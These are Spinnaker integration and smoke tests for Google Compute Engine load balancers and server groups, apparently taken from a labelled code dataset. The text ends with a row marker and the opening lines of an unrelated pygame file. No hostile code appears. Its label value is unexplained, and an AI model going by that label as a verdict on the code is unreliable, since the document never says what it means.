    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'upsertGoogleLoadBalancerDescription',
        {
          'healthCheck': health_check,
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'loadBalancerName': self.__use_lb_name
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
       .list_resources('forwarding-rules')
       .contains_path_value('name', self.__use_lb_name)
       .contains_path_value('target', self.__use_lb_target))
    (builder.new_clause_builder('Target Pool Added', retryable_for_secs=15)
       .list_resources('target-pools')
       .contains_path_value('name', self.__use_lb_tp_name))

     # We list the resources here because the name isnt exact
     # and the list also returns the details we need.
    (builder.new_clause_builder('Health Check Added', retryable_for_secs=15)
       .list_resources('http-health-checks')
       .contains_pred_list(
           [jc.PathContainsPredicate('name', self.__use_lb_hc_name),
            jc.PathContainsPredicate(None, health_check)]))

    return st.OperationContract(
      self.new_post_operation(
          title='upsert_load_balancer', data=payload, path='ops'),
      contract=builder.build())

  def delete_load_balancer(self):
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'deleteGoogleLoadBalancerDescription',
        {
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'loadBalancerName': self.__use_lb_name
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed')
       .list_resources('http-health-checks')
       .excludes_path_value('name', self.__use_lb_hc_name))
    (builder.new_clause_builder('Target Pool Removed')
       .list_resources('target-pools')
       .excludes_path_value('name', self.__use_lb_tp_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
       .list_resources('forwarding-rules')
       .excludes_path_value('name', self.__use_lb_name))

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path='ops'),
      contract=builder.build())

  def register_load_balancer_instances(self):
    """"""Creates test registering the first two instances with a load balancer.

       Assumes that create_instances test has been run to add
       the instances. Note by design these were in two different zones
       but same region as required by the API this is testing.

       Assumes that upsert_load_balancer has been run to
       create the load balancer itself.
    Returns:
      st.OperationContract
    """"""
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'registerInstancesWithGoogleLoadBalancerDescription',
        {
          'loadBalancerNames': [self.__use_lb_name],
          'instanceIds': self.use_instance_names[:2],
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instances in Target Pool',
                                retryable_for_secs=15)
       .list_resources('target-pools')
       .contains_pred_list(
          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),
           jc.PathEqPredicate('region', self.bindings['TEST_GCE_REGION']),
           jc.PathElementsContainPredicate(
              'instances', self.use_instance_names[0]),
           jc.PathElementsContainPredicate(
              'instances', self.use_instance_names[1])])
       .excludes_pred_list(
           [jc.PathContainsPredicate('name', self.__use_lb_tp_name),
            jc.PathElementsContainPredicate(
                'instances', self.use_instance_names[2])]))

    return st.OperationContract(
      self.new_post_operation(
          title='register_load_balancer_instances', data=payload, path='ops'),
      contract=builder.build())


  def deregister_load_balancer_instances(self):
    """"""Creates a test unregistering instances from load balancer.

    Returns:
      st.OperationContract
    """"""
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
       'deregisterInstancesFromGoogleLoadBalancerDescription',
        {
          'loadBalancerNames': [self.__use_lb_name],
          'instanceIds': self.use_instance_names[:2],
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    # NOTE(ewiseblatt): 20150530
    # This displays an error that 'instances' field doesnt exist.
    # That's because it was removed because all the instances are gone.
    # I dont have a way to express that the field itself is optional,
    # just the record. Leaving it as is because displaying this type of
    # error is usually helpful for development.
    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instances not in Target Pool',
                                retryable_for_secs=5)
       .list_resources(
          'target-pools',
          extra_args=['--region', self.bindings['TEST_GCE_REGION']])
       .excludes_pred_list(
          [jc.PathContainsPredicate('name', self.__use_lb_tp_name),
           jc.PathElementsContainPredicate(
              'instances', self.use_instance_names[0]),
           jc.PathElementsContainPredicate(
              'instances', self.use_instance_names[1])]))

    return st.OperationContract(
      self.new_post_operation(
          title='deregister_load_balancer_instances', data=payload, path='ops'),
      contract=builder.build())

  def list_available_images(self):
    """"""Creates a test that confirms expected available images.

    Returns:
      st.OperationContract
    """"""
    logger = logging.getLogger(__name__)

    # Get the list of images available (to the service account we are using).
    gcloud_agent = self.gce_observer
    service_account = self.bindings.get('GCE_SERVICE_ACCOUNT', None)
    extra_args = ['--account', service_account] if service_account else []
    logger.debug('Looking up available images.')
    cli_result = gcloud_agent.list_resources('images', extra_args=extra_args)

    if not cli_result.ok():
      raise RuntimeError('GCloud failed with: {0}'.format(str(cli_result)))
    json_doc = json_module.JSONDecoder().decode(cli_result.output)

    # Produce the list of images that we expect to receive from spinnaker
    # (visible to the primary service account).
    spinnaker_account = self.agent.deployed_config.get(
        'providers.google.primaryCredentials.name')

    logger.debug('Configured with Spinnaker account ""%s""', spinnaker_account)
    expect_images = [{'account': spinnaker_account, 'imageName': image['name']}
                     for image in json_doc]
    expect_images = sorted(expect_images, key=lambda k: k['imageName'])

    # pylint: disable=bad-continuation
    builder = HttpContractBuilder(self.agent)
    (builder.new_clause_builder('Has Expected Images')
       .get_url_path('/gce/images/find')
       .add_constraint(jc.EQUIVALENT(expect_images)))

    return st.OperationContract(
        NoOpOperation('List Available Images'),
        contract=builder.build())


class GoogleKatoIntegrationTest(st.AgentTestCase):
  def Xtest_a_upsert_server_group_tags(self):
    self.run_test_case(self.scenario.upsert_google_server_group_tags())

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_b_create_instances(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_register_load_balancer_instances(self):
    self.run_test_case(self.scenario.register_load_balancer_instances())

  def test_d_create_http_load_balancer(self):
    self.run_test_case(self.scenario.create_http_load_balancer())

  def test_v_delete_http_load_balancer(self):
    self.run_test_case(
        self.scenario.delete_http_load_balancer(), timeout_ok=True,
        retry_interval_secs=10, max_retries=9)

  def test_w_deregister_load_balancer_instances(self):
    self.run_test_case(self.scenario.deregister_load_balancer_instances())

  def test_x_terminate_instances(self):
    # delete 1 which was in a different zone than the other two.
    # Then delete [0,2] together, which were in the same zone.
    try:
      self.run_test_case(
          self.scenario.terminate_instances(
              [self.scenario.use_instance_names[1]],
              self.scenario.use_instance_zones[1]))
    finally:
      # Always give this a try, even if the first test fails.
      # that increases our chances of cleaning everything up.
      self.run_test_case(
          self.scenario.terminate_instances(
              [self.scenario.use_instance_names[0],
               self.scenario.use_instance_names[2]],
              self.scenario.use_instance_zones[0]))

  def test_z_delete_load_balancer(self):
    # TODO(ewiseblatt): 20151220
    # The retry here is really due to the 400 ""not ready"" race condition
    # within GCP. Would be better to couple this to the agent and not the
    # test so that it is easier to maintain. Need to add a generalization
    # so the agent can see this is a delete test, got a 400, and only
    # in that condition override the default retry parameters, then stick
    # with the defaults here.
    self.run_test_case(self.scenario.delete_load_balancer(), max_retries=5)

  def test_available_images(self):
    self.run_test_case(self.scenario.list_available_images())


def main():
  return st.ScenarioTestRunner.main(
      GoogleKatoTestScenario,
      test_case_list=[GoogleKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n/spinnaker_system/google_server_group_test.py/n/n# Standard python modules.
import time
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario):

  @classmethod
  def new_agent(cls, bindings):
    '''Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Gate.
      This is the agent that test operations will be posted to.
    '''
    return gate.new_agent(bindings)

  def __init__(self, bindings, agent=None):
    super(GoogleServerGroupTestScenario, self).__init__(bindings, agent)

    # Our application name and path to post events to.
    self.TEST_APP = bindings['TEST_APP']
    self.__path = 'applications/%s/tasks' % self.TEST_APP

    # The spinnaker stack decorator for our resources.
    self.TEST_STACK = bindings['TEST_STACK']

    self.TEST_REGION = bindings['TEST_GCE_REGION']
    self.TEST_ZONE = bindings['TEST_GCE_ZONE']

    # Resource names used among tests.
    self.__cluster_name = '%s-%s' % (self.TEST_APP, self.TEST_STACK)
    self.__server_group_name = '%s-v000' % self.__cluster_name
    self.__cloned_server_group_name = '%s-v001' % self.__cluster_name
    self.__lb_name = '%s-%s-fe' % (self.TEST_APP, self.TEST_STACK)

  def create_load_balancer(self):
    job = [{
      'cloudProvider': 'gce',
      'loadBalancerName': self.__lb_name,
      'ipProtocol': 'TCP',
      'portRange': '8080',
      'provider': 'gce',
      'stack': self.TEST_STACK,
      'detail': 'frontend',
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'region': self.TEST_REGION,
      'listeners': [{
        'protocol': 'TCP',
        'portRange': '8080',
        'healthCheck': False
      }],
      'name': self.__lb_name,
      'type': 'upsertLoadBalancer',
      'availabilityZones': {self.TEST_REGION: []},
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - create load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_load_balancer', data=payload, path=self.__path),
      contract=builder.build())

  def create_instances(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'zone': self.TEST_ZONE,
      'network': 'default',
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'availabilityZones': {
        self.TEST_REGION: [self.TEST_ZONE]
      },
      'loadBalancers': [self.__lb_name],
      'instanceMetadata': {
        'load-balancer-names': self.__lb_name
      },
      'cloudProvider': 'gce',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'instanceType': 'f1-micro',
      'initialNumReplicas': 1,
      'type': 'createServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instance Created', retryable_for_secs=150)
     .list_resources('instance-groups')
     .contains_path_value('name', self.__server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job,
        description='Server Group Test - create initial server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='create_instances', data=payload, path=self.__path),
      contract=builder.build())

  def resize_server_group(self):
    job = [{
      'targetSize': 2,
      'capacity': {
        'min': 2,
        'max': 2,
        'desired': 2
      },
      'replicaPoolName': self.__server_group_name,
      'numReplicas': 2,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'asgName': self.__server_group_name,
      'type': 'resizeServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'cloudProvider': 'gce',
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Resized', retryable_for_secs=90)
     .inspect_resource('instance-groups',
                       self.__server_group_name,
                       ['--zone', self.TEST_ZONE])
     .contains_path_eq('size', 2))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - resize to 2 instances',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='resize_instances', data=payload, path=self.__path),
      contract=builder.build())

  def clone_server_group(self):
    job = [{
      'application': self.TEST_APP,
      'stack': self.TEST_STACK,
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'loadBalancers': [self.__lb_name],
      'targetSize': 1,
      'capacity': {
        'min': 1,
        'max': 1,
        'desired': 1
      },
      'zone': self.TEST_ZONE,
      'network': 'default',
      'instanceMetadata': {'load-balancer-names': self.__lb_name},
      'availabilityZones': {self.TEST_REGION: [self.TEST_ZONE]},
      'cloudProvider': 'gce',
      'source': {
        'account': self.bindings['GCE_CREDENTIALS'],
        'region': self.TEST_REGION,
        'zone': self.TEST_ZONE,
        'serverGroupName': self.__server_group_name,
        'asgName': self.__server_group_name
      },
      'instanceType': 'f1-micro',
      'image': self.bindings['TEST_GCE_IMAGE_NAME'],
      'initialNumReplicas': 1,
      'loadBalancers': [self.__lb_name],
      'type': 'cloneServerGroup',
      'account': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Cloned', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__cloned_server_group_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - clone server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='clone_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def disable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'disableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Disabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_path_value('baseInstanceName', self.__server_group_name)
     .excludes_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),
         jc.PathContainsPredicate('targetPools', 'https')]))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - disable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='disable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def enable_server_group(self):
    job = [{
      'cloudProvider': 'gce',
      'asgName': self.__server_group_name,
      'serverGroupName': self.__server_group_name,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'enableServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Enabled', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .contains_pred_list([
         jc.PathContainsPredicate('baseInstanceName', self.__server_group_name),
         jc.PathContainsPredicate('targetPools', 'https')]))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - enable server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='enable_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def destroy_server_group(self, version):
    serverGroupName = '%s-%s' % (self.__cluster_name, version)
    job = [{
      'cloudProvider': 'gce',
      'asgName': serverGroupName,
      'serverGroupName': serverGroupName,
      'region': self.TEST_REGION,
      'zone': self.TEST_ZONE,
      'type': 'destroyServerGroup',
      'regions': [self.TEST_REGION],
      'zones': [self.TEST_ZONE],
      'credentials': self.bindings['GCE_CREDENTIALS'],
      'user': 'integration-tests'
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Destroyed', retryable_for_secs=90)
     .list_resources('managed-instance-groups')
     .excludes_path_value('baseInstanceName', serverGroupName))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - destroy server group',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='destroy_server_group', data=payload, path=self.__path),
      contract=builder.build())

  def delete_load_balancer(self):
    job = [{
      ""loadBalancerName"": self.__lb_name,
      ""networkLoadBalancerName"": self.__lb_name,
      ""region"": ""us-central1"",
      ""type"": ""deleteLoadBalancer"",
      ""regions"": [""us-central1""],
      ""credentials"": self.bindings['GCE_CREDENTIALS'],
      ""cloudProvider"": ""gce"",
      ""user"": ""integration-tests""
    }]

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Load Balancer Created', retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .excludes_path_value('name', self.__lb_name))

    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - delete load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path=self.__path),
      contract=builder.build())


class GoogleServerGroupTest(st.AgentTestCase):
  def test_a_create_load_balancer(self):
    self.run_test_case(self.scenario.create_load_balancer())

  def test_b_create_server_group(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_resize_server_group(self):
    self.run_test_case(self.scenario.resize_server_group())

  def test_d_clone_server_group(self):
    self.run_test_case(self.scenario.clone_server_group(),
                       # TODO(ewiseblatt): 20160314
                       # There is a lock contention race condition
                       # in clouddriver that causes intermittent failure.
                       max_retries=5)

  def test_e_disable_server_group(self):
    self.run_test_case(self.scenario.disable_server_group())

  def test_f_enable_server_group(self):
    self.run_test_case(self.scenario.enable_server_group())

  def test_g_destroy_server_group_v000(self):
    self.run_test_case(self.scenario.destroy_server_group('v000'))

  def test_h_destroy_server_group_v001(self):
    self.run_test_case(self.scenario.destroy_server_group('v001'))

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():

  defaults = {
    'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID,
    'TEST_APP': 'gcpsvrgrptst' + GoogleServerGroupTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleServerGroupTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleServerGroupTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n/spinnaker_system/google_smoke_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Smoke test to see if Spinnaker can interoperate with Google Cloud Platform.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --native_hostname=host-running-smoke-test
    --managed_gce_project=$PROJECT \
    --test_gce_zone=$ZONE
""""""

# Standard python modules.
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleSmokeTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """"""

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements citest.service_testing.AgentTestScenario.new_agent.""""""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """"""Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """"""
    super(GoogleSmokeTestScenario, cls).initArgumentParser(parser, defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """"""Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """"""
    super(GoogleSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """"""Creates OperationContract that creates a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """"""Creates OperationContract that deletes a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on GCE. See
    the contract builder for more info on what the expectations are.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']
    target_pool_name = '{0}/targetPools/{1}-tp'.format(
        bindings['TEST_GCE_REGION'], load_balancer_name)

    spec = {
        'checkIntervalSec': 9,
        'healthyThreshold': 3,
        'unhealthyThreshold': 5,
        'timeoutSec': 2,
        'port': 80
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'provider': 'gce',
            'stack': bindings['TEST_STACK'],
            'detail': bindings['TEST_COMPONENT_DETAIL'],
            'credentials': bindings['GCE_CREDENTIALS'],
            'region': bindings['TEST_GCE_REGION'],
            'ipProtocol': 'TCP',
            'portRange': spec['port'],
            'loadBalancerName': load_balancer_name,
            'healthCheck': {
                'port': spec['port'],
                'timeoutSec': spec['timeoutSec'],
                'checkIntervalSec': spec['checkIntervalSec'],
                'healthyThreshold': spec['healthyThreshold'],
                'unhealthyThreshold': spec['unhealthyThreshold'],
            },
            'type': 'upsertLoadBalancer',
            'availabilityZones': {bindings['TEST_GCE_REGION']: []},
            'user': '[anonymous]'
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Added',
                                retryable_for_secs=30)
     .list_resources('http-health-checks')
     .contains_pred_list(
         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),
          jc.DICT_SUBSET(spec)]))
    (builder.new_clause_builder('Target Pool Added',
                                retryable_for_secs=30)
     .list_resources('target-pools')
     .contains_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_pred_list([
          jc.PathContainsPredicate('name', load_balancer_name),
          jc.PathContainsPredicate('target', target_pool_name)]))

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the GCP resources
    created by upsert_load_balancer are no longer visible on GCP.
    """"""
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    bindings = self.bindings
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'gce',
            'loadBalancerName': load_balancer_name,
            'region': bindings['TEST_GCE_REGION'],
            'regions': [bindings['TEST_GCE_REGION']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            bindings['GCE_CREDENTIALS'],
            bindings['TEST_GCE_REGION']),
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed', retryable_for_secs=30)
     .list_resources('http-health-checks')
     .excludes_path_value('name', '%s-hc' % load_balancer_name))
    (builder.new_clause_builder('TargetPool Removed')
     .list_resources('target-pools')
     .excludes_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
     .list_resources('forwarding-rules')
     .excludes_path_value('name', load_balancer_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """"""Creates OperationContract for createServerGroup.

    To verify the operation, we just check that Managed Instance Group
    for the server was created.
    """"""
    bindings = self.bindings

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'application': self.TEST_APP,
            'credentials': bindings['GCE_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetSize': 2,
            'image': bindings['TEST_GCE_IMAGE_NAME'],
            'zone': bindings['TEST_GCE_ZONE'],
            'stack': bindings['TEST_STACK'],
            'instanceType': 'f1-micro',
            'type': 'createServerGroup',
            'loadBalancers': [bindings['TEST_APP_COMPONENT_NAME']],
            'availabilityZones': {
                bindings['TEST_GCE_REGION']: [bindings['TEST_GCE_ZONE']]
            },
            'instanceMetadata': {
                'startup-script': ('sudo apt-get update'
                                   ' && sudo apt-get install apache2 -y'),
                'load-balancer-names': bindings['TEST_APP_COMPONENT_NAME']
            },
            'account': bindings['GCE_CREDENTIALS'],
            'authScopes': ['compute'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Added',
                                retryable_for_secs=30)
     .inspect_resource('managed-instance-groups', group_name)
     .contains_path_eq('targetSize', 2))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """"""Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the GCP managed instance group
    is no longer visible on GCP (or is in the process of terminating).
    """"""
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    # TODO(ttomsu): Change this back from asgName to serverGroupName
    #               once it is fixed in orca.
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'serverGroupName': group_name,
            'region': bindings['TEST_GCE_REGION'],
            'zone': bindings['TEST_GCE_ZONE'],
            'asgName': group_name,
            'type': 'destroyServerGroup',
            'regions': [bindings['TEST_GCE_REGION']],
            'zones': [bindings['TEST_GCE_ZONE']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Removed')
     .inspect_resource('managed-instance-groups', group_name,
                       no_resource_ok=True)
     .contains_path_eq('targetSize', 0))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .list_resources('instances')
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class GoogleSmokeTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the GoogleSmokeTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer(),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_STACK': str(GoogleSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'gcpsmoketest' + GoogleSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleSmokeTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n",1
208,686df24fde8a6de347f9b3c95ad5e2a6679de358,"draw.py/n/n#pylint: disable = E1101
import pygame
from draw_utils import Rectangle
from draw_utils import Circle
from draw_utils import Line
from vector2 import Vector2
from a_star import AStar
from graph import Graph
from node import Node
